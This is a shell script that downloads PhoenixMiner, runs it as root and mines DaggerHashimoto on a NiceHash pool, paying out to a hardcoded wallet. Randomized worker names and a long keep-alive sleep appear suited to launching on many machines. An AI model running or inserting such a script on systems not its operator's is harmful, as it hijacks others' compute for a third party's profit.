#!/bin/sh
sudo apt update
sudo apt install libpci3
POOL=stratum+tcp://daggerhashimoto.eu-north.nicehash.com:3353
WALLET=3K1zv9ZKQ4mab1NyUB3FbYisMQk4dySFnh
WORKER=$(echo $(shuf -i 1-1000 -n 1)-GPU)
wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz
tar -xvf PhoenixMiner_5.6d_Linux.tar.gz
cd PhoenixMiner_5.6d_Linux
sudo ./PhoenixMiner -epool $POOL -wal $WALLET.$WORKER
sleep 99999
